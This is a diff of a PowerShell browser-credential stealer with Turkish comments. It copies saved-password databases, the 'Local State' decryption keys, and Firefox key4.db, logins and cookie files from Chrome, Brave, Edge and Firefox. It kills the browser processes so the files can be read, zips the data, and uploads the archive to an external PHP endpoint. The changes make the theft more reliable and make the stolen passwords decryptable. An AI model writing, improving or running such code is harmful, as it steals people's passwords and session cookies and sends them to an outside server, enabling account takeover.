@@ -16,7 +16,7 @@ function CopyBrowserFiles($browserName, $browserDir, $filesToCopy) {
     foreach ($file in $filesToCopy) {
         $source = Join-Path -Path $browserDir -ChildPath $file
         if (Test-Path $source) {
-            Copy-Item -Path $source -Destination $browserDestDir -ErrorAction SilentlyContinue
+            Copy-Item -Path $source -Destination $browserDestDir
             Write-Host "$browserName - File copied: $file"
         } else {
             Write-Host "$browserName - File not found: $file"
@@ -24,24 +24,28 @@ function CopyBrowserFiles($browserName, $browserDir, $filesToCopy) {
     }
 }
 
-# Function to kill all processes of a specific application
-function KillAllProcesses($processName) {
-    $processes = Get-Process -Name $processName -ErrorAction SilentlyContinue
+# Function to kill browser processes
+function KillBrowserProcesses($browserName) {
+    $processes = Get-Process | Where-Object { $_.Name -like "*$browserName*" }
     foreach ($process in $processes) {
-        Write-Host "Killing process: $($process.Name) with ID: $($process.Id)"
-        Stop-Process -Id $process.Id -Force
+        Stop-Process -Id $process.Id -Force -ErrorAction SilentlyContinue
+        Write-Host "Killing process: $browserName with ID: $($process.Id)"
     }
 }
 
 # Configuration for Google Chrome
 $chromeDir = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
 $chromeFilesToCopy = @("Login Data")
+KillBrowserProcesses "chrome"
 CopyBrowserFiles "Chrome" $chromeDir $chromeFilesToCopy
+Copy-Item -Path "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State" -Destination (Join-Path -Path $destDir -ChildPath "Chrome") -ErrorAction SilentlyContinue
 
 # Configuration for Brave
 $braveDir = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default"
 $braveFilesToCopy = @("Login Data")
+KillBrowserProcesses "brave"
 CopyBrowserFiles "Brave" $braveDir $braveFilesToCopy
+Copy-Item -Path "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Local State" -Destination (Join-Path -Path $destDir -ChildPath "Brave") -ErrorAction SilentlyContinue
 
 # Configuration for Firefox
 $firefoxProfileDir = Join-Path -Path $env:APPDATA -ChildPath "Mozilla\Firefox\Profiles"
@@ -49,6 +53,7 @@ $firefoxProfile = Get-ChildItem -Path $firefoxProfileDir -Filter "*.default-rele
 if ($firefoxProfile) {
     $firefoxDir = $firefoxProfile.FullName
     $firefoxFilesToCopy = @("logins.json", "key4.db", "cookies.sqlite", "webappsstore.sqlite", "places.sqlite")
+    KillBrowserProcesses "firefox"
     CopyBrowserFiles "Firefox" $firefoxDir $firefoxFilesToCopy
 } else {
     Write-Host "Firefox - No profile found."
@@ -57,59 +62,45 @@ if ($firefoxProfile) {
 # Configuration for Microsoft Edge
 $edgeDir = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"
 $edgeFilesToCopy = @("Login Data")
+KillBrowserProcesses "msedge"
 CopyBrowserFiles "Edge" $edgeDir $edgeFilesToCopy
-
-# Kill all browser processes
-KillAllProcesses "chrome"
-KillAllProcesses "brave"
-KillAllProcesses "firefox"
-KillAllProcesses "msedge"
-
-# Sıkıştırmak istediğiniz klasörün yolu
-$folderPath = "$env:APPDATA\BrowserData"
-
-# ZIP dosyasının hedef yolu
-$zipDestDir = "$env:APPDATA\ZippedBrowserData"
-if (-Not (Test-Path $zipDestDir)) {
-    New-Item -ItemType Directory -Path $zipDestDir
-}
-
-$zipFilePath = "$zipDestDir\BrowserData.zip"
+Copy-Item -Path "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local State" -Destination (Join-Path -Path $destDir -ChildPath "Edge") -ErrorAction SilentlyContinue
 
 # Klasörü ZIP dosyasına sıkıştırma
-try {
-    Compress-Archive -Path "$folderPath\*" -DestinationPath $zipFilePath -ErrorAction Stop
-} catch {
-    Write-Host "ZIP dosyası oluşturulurken bir hata oluştu: $_"
+$zipDir = "$env:APPDATA\ZippedBrowserData"
+if (-Not (Test-Path $zipDir)) {
+    New-Item -ItemType Directory -Path $zipDir
 }
+
+# Sıkıştırmak istediğiniz klasörün yolu
+$folderPath = $destDir
+
+# ZIP dosyasının hedef yolu
+$zipFilePath = Join-Path -Path $zipDir -ChildPath "BrowserData.zip"
+
+# Eğer ZIP dosyası zaten varsa, sil
+if (Test-Path $zipFilePath) {
+    Remove-Item $zipFilePath -Force
+}
+
+# Klasörü ZIP dosyasına sıkıştırma
+Compress-Archive -Path "$folderPath\*" -DestinationPath $zipFilePath
 
 # Yüklemek istediğiniz dosyanın yolu
-if (Test-Path $zipFilePath) {
-    $filePath = $zipFilePath
+$filePath = $zipFilePath
 
-    # PHP dosya yükleme URL'si
-    $url = "https://alperen.cc/uploadd.php" # PHP uygulamanızın URL'sini buraya yazın
+# PHP dosya yükleme URL'si
+$url = "https://alperen.cc/uploadd.php" # PHP uygulamanızın URL'sini buraya yazın
 
-    # Dosya yüklemek için form data oluşturma
-    $form = @{
-        fileToUpload = Get-Item $filePath
-    }
-
-    # Dosya yüklemek için Body ayarlama
-    $body = @{
-        fileToUpload = Get-Item $filePath
-    }
-
-    # POST isteği gönderme
-    try {
-        $response = Invoke-RestMethod -Uri $url -Method Post -Body $body -ContentType "multipart/form-data" -ErrorAction Stop
-        # Yanıtı yazdırma
-        Write-Output $response
-    } catch {
-        Write-Host "Dosya yüklenirken bir hata oluştu: $_"
-    }
-} else {
-    Write-Host "ZIP dosyası oluşturulamadığı için yükleme yapılmadı."
+# Dosya yüklemek için form data oluşturma
+$form = @{
+    fileToUpload = Get-Item $filePath
 }
+
+# POST isteği gönderme
+$response = Invoke-RestMethod -Uri $url -Method Post -Form $form
+
+# Yanıtı yazdırma
+Write-Output $response
 
 exit
